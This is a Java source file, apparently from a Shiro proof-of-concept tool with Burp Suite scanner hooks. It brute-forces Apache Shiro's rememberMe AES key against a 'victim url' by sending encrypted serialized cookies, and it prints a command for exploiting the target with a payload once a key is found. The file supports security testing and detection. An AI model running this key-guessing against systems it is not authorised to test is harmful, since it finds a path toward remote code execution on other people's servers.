package org.unicodesec;


import burp.*;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import org.apache.http.Header;
import org.apache.http.HttpHeaders;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.shiro.subject.SimplePrincipalCollection;
import yso.payloads.Strings;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.util.LinkedList;
import java.util.List;

public class poc {
    public static void main(String[] args) throws Exception {
        System.out.println(Version.text);
        if (args.length == 0) {
            System.out.println("java -cp shiroPoc-[version]-all.jar org.unicodesec.poc [victim url]");
            System.out.println("java -cp shiroPoc-[version]-all.jar org.unicodesec.poc [victim url] shiroKey");
            System.out.println("eg:");
            System.out.println("\tjava -cp shiroPoc-[version]-all.jar org.unicodesec.poc http://127.0.0.1:8080/shiro\n");
            System.out.println("如果你想使用自定义shiro key检测，请使用如下命令");
            System.out.println("\tjava -cp shiroPoc-[version]-all.jar org.unicodesec.poc http://127.0.0.1:8080/shiro kPH+bIxk5D2deZiIxcaaaA==\n");
            System.err.println("  Available shiro key:");

            final List<String[]> rows = new LinkedList<String[]>();
            rows.add(new String[]{"index", "key"});
            rows.add(new String[]{"---------------", "---------------"});
            for (int i = 0; i < keys.keys.length; i++) {
                rows.add(new String[]{
                        String.valueOf(i),
                        keys.keys[i],
                });
            }

            final List<String> lines = Strings.formatTable(rows);
            for (String line : lines) {
                System.err.println("     " + line);
            }
            return;
        }

        String victimUrl = args[0];
        String key = "";
        if (args.length == 2) {
            key = args[1];
            if (Base64.decode(key).length != 16) {
                System.out.println("密钥长度错误，aes加密中，密钥长度为16位");
            }
        }
        CloseableHttpClient httpclient = HttpClients.createDefault();
        if (key.length() > 0) {
            if (detectShiroVuln(victimUrl, httpclient, key)) return;
        } else {
            for (int i = 0; i < keys.keys.length; i++) {
                if (detectShiroVuln(victimUrl, httpclient, keys.keys[i])) return;
            }
        }

        System.out.println(String.format("not found Shiro Vulnerability,"));


    }

    private static boolean detectShiroVuln(String victimUrl, CloseableHttpClient httpclient, String key) throws Exception {
        byte[] bytes = MakeGadget();
        String rememberMe = EncryptUtil.shiroEncrypt(key, bytes);
        HttpGet request = new HttpGet(victimUrl);
        request.setHeader(HttpHeaders.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36");
        request.setHeader("Cookie", "rememberMe=" + rememberMe);
        CloseableHttpResponse response = httpclient.execute(request);
        if (response.getStatusLine().getStatusCode() == 200) {
            boolean isDeleteMe = false;
            for (Header h : response.getAllHeaders()) {
                if (h.getName().toLowerCase().contains("set-cookie")) {
                    if (h.getValue().contains("rememberMe=deleteMe")) {
                        isDeleteMe = true;
                    }
                }
            }
            if (isDeleteMe == false) {
                System.out.println(String.format("found Shiro Vulnerability, Shiro key %s", key));
                System.out.println("use this command to exploit shiro:");
                System.out.println(String.format("\tjava -jar shiroPoc-[version]-all.jar %s [payload] [exploit type]", key));
                return true;
            }
        }


        response.close();
        return false;
    }

    private static byte[] MakeGadget() throws Exception {
        SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
        return getBytes(simplePrincipalCollection);
    }

    private static byte[] getBytes(Object obj) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream;
        ObjectOutputStream objectOutputStream;
        byteArrayOutputStream = new ByteArrayOutputStream();
        objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.flush();
        return byteArrayOutputStream.toByteArray();
    }

    public static CustomScanIssue creteCustomScanIssue(IHttpRequestResponse iHttpRequestResponse, IExtensionHelpers helpers, PrintWriter stdout) {
        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);
        String detail = String.format("detect shiro framework in %s", requestInfo.getUrl());
        stdout.println(detail);

        return new CustomScanIssue(
                iHttpRequestResponse.getHttpService(),
                requestInfo.getUrl(),
                new IHttpRequestResponse[]{iHttpRequestResponse},
                String.format("%s Shiro framework", requestInfo.getUrl()),
                detail,
                "Information");
    }

    public static IScanIssue shiroDetect(IHttpRequestResponse iHttpRequestResponse, IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks) {
        // 检测目标服务器是否存在shiro框架
        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);
        IResponseInfo responseInfo = helpers.analyzeResponse(iHttpRequestResponse.getResponse());
        PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);

        // check if response set-cookie headers containss rememberMe
        for (ICookie cookie : responseInfo.getCookies()) {
            if (cookie.getName().contains("rememberMe") || cookie.getValue().contains("deleteMe")) {
                return creteCustomScanIssue(iHttpRequestResponse, helpers, stdout);
            }
        }

        // check rsequest header
        List<String> headers = requestInfo.getHeaders();
        for (String header : headers) {
            if (header.contains("rememberMe")) {
                return creteCustomScanIssue(iHttpRequestResponse, helpers, stdout);
            }
        }

        // 主动发包探测一下
        IHttpService httpService = iHttpRequestResponse.getHttpService();

        IParameter newParameter = helpers.buildParameter("rememberMe", "1", (byte) 2);
        byte[] newRequest = helpers.updateParameter(iHttpRequestResponse.getRequest(), newParameter);
        IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);

        IResponseInfo newResponseInfo = helpers.analyzeResponse(newHttpRequestResponse.getResponse());
        for (ICookie cookie : newResponseInfo.getCookies()) {
            if (cookie.getName().contains("rememberMe") || cookie.getValue().contains("deleteMe")) {
                return creteCustomScanIssue(newHttpRequestResponse, helpers, stdout);
            }
        }
        // 什么都没有返回null
        return null;
    }

    public static IScanIssue shiroKey(IHttpRequestResponse iHttpRequestResponse, IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks) throws Exception {
        // 检测shiro的key
        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);
        PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);

        IHttpService httpService = iHttpRequestResponse.getHttpService();
        for (int i = 0; i < keys.keys.length; i++) {
            IResponseInfo newResponseInfo = getiResponseInfo(iHttpRequestResponse, helpers, callbacks, httpService, keys.keys[i]);
            boolean isDeleteMe = false;
            for (ICookie cookie : newResponseInfo.getCookies()) {
                if (cookie.getName().contains("rememberMe") && cookie.getValue().contains("deleteMe")) {
                    isDeleteMe = true;
                }
            }
            if (isDeleteMe == false) {
                // 说明可能已经检测到shiro密钥，需要设置一个不存在的key
                String randomKey = "MTIzNDU2NzgxMjM0NTY3OA==";
                IResponseInfo newResponseInfo1 = getiResponseInfo(iHttpRequestResponse, helpers, callbacks, httpService, randomKey);
                for (ICookie cookie : newResponseInfo1.getCookies()) {
                    if (cookie.getName().contains("rememberMe") && cookie.getValue().contains("deleteMe")) {
                        // 如果真的用shiro，设置一个随机的key。一定返回deleteMe
                        String detail = String.format("detect shiro key %s in %s", keys.keys[i], requestInfo.getUrl());
                        stdout.println(detail);

                        return new CustomScanIssue(
                                iHttpRequestResponse.getHttpService(),
                                requestInfo.getUrl(),
                                new IHttpRequestResponse[]{iHttpRequestResponse},
                                String.format("%s ShiroCipherKey %s", requestInfo.getUrl(), keys.keys[i]),
                                detail,
                                "High");
                    }
                }

            }
        }
        // 什么都没有返回null
        return null;
    }

    private static IResponseInfo getiResponseInfo(IHttpRequestResponse iHttpRequestResponse, IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, IHttpService httpService, String key) throws Exception {
        byte[] bytes = MakeGadget();
        String rememberMe = EncryptUtil.shiroEncrypt(key, bytes);
        IParameter newParameter = helpers.buildParameter("rememberMe", rememberMe, (byte) 2);
        byte[] newRequest = helpers.updateParameter(iHttpRequestResponse.getRequest(), newParameter);
        IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
        return helpers.analyzeResponse(newHttpRequestResponse.getResponse());
    }

}

